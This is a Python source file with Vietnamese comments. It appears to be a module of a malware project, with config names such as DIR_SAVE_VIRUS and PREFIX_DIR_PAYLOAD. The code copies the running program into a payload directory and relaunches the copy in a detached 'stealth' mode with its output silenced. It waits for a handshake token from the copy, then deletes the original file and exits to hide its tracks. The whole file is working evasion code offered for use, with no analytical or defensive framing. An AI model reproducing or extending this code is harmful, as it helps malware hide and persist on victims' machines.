import os
import sys
import tempfile
import shutil
import time
import subprocess
import stat
from config import DIR_SAVE_VIRUS, PREFIX_DIR_PAYLOAD, DIR_TOKEN_HANDSHAKE

HANDSHAKE_TIMEOUT = 10.0
HANDSHAKE_POLL = 0.2

def is_stealth_mode(argv=None):
    if argv is None:
        argv = sys.argv
    return "--stealth" in argv

def make_ready_token():
    dirToken = os.path.expanduser(DIR_TOKEN_HANDSHAKE)
    os.makedirs(dirToken, exist_ok=True)
    fd, path = tempfile.mkstemp(prefix="_payload_ready_", dir=dirToken)
    os.close(fd)
    try:
        os.remove(path)   # chỉ lấy tên file; child sẽ tạo lúc ready
    except Exception:
        pass
    return path

def safe_self_relocate(file_name: str = sys.argv[0]) -> bool:
    try:
        if is_stealth_mode():
            print("[+] Running in mode stealth")
            return True

        current_file = os.path.abspath(file_name)
        print(f"[+] Current file: {current_file}")

        temp_dir = tempfile.mkdtemp(prefix=PREFIX_DIR_PAYLOAD, dir=os.path.expanduser(DIR_SAVE_VIRUS))
        print(f"[✔] Tạo thư mục tạm: {temp_dir}")
        temp_copy = os.path.join(temp_dir, os.path.basename(current_file))

        shutil.copy2(current_file, temp_copy)
        os.chmod(temp_copy, 0o755)

        print(f"[✔] Created copy: {temp_copy}")

        # Tạo token handshake (parent sẽ chờ file này xuất hiện)
        ready_token = make_ready_token()

        # Khởi chạy child với token
        cmd = [temp_copy, "--stealth", "--ready-file", ready_token]
        child = subprocess.Popen(cmd, close_fds=True, start_new_session=True, stdout=subprocess.DEVNULL, stdin=subprocess.DEVNULL)

        # Chờ child tạo file ready trong timeout
        start = time.time()
        while True:
            if os.path.exists(ready_token):
                print("[✔] Child sad ready")
                break
            if (time.time() - start) > HANDSHAKE_TIMEOUT:
                print("⚠️ Timeout waits for child ready; will not delete original file")
                return False
            time.sleep(HANDSHAKE_POLL)

        # child đã sẵn sàng => xóa file gốc an toàn
        try:
            os.remove(current_file)
            print("🗑️ Deleted original file")
        except Exception as e:
            print(f"⚠️ Cannot delete original file: {e}")
            return False

        print("[+] Terminate the original process")
        sys.exit(0)

    except Exception as e:
        print(f"[-] Error: {e}")
        return False

def child_setup_ready(argv=None):
    """Nếu chạy ở chế độ stealth và có --ready-file, child sẽ tạo file ready."""
    if argv is None:
        argv = sys.argv
    if "--ready-file" in argv:
        idx = argv.index("--ready-file")
        if idx + 1 < len(argv):
            ready_path = argv[idx + 1]
            try:
                # đảm bảo parent có thể thấy file nhanh
                open(ready_path, "w").close()
                # option: fsync not necessary for simple case
                print(f"[+] Created ready token: {ready_path}")
            except Exception as e:
                print(f"[-] Can't ready token: {e}")

def is_running_in_temp_dir():
    current_path = os.path.abspath(sys.argv[0])
    dir_save_virus = os.path.expanduser(DIR_SAVE_VIRUS)
    temp_dir = os.path.join(dir_save_virus, PREFIX_DIR_PAYLOAD)
    return os.path.dirname(current_path).startswith(temp_dir)

def run_copy_process():
    child_setup_ready()


if __name__ == "__main__":
    if not is_stealth_mode() and not is_running_in_temp_dir():
        safe_self_relocate()
    else:
        run_copy_process()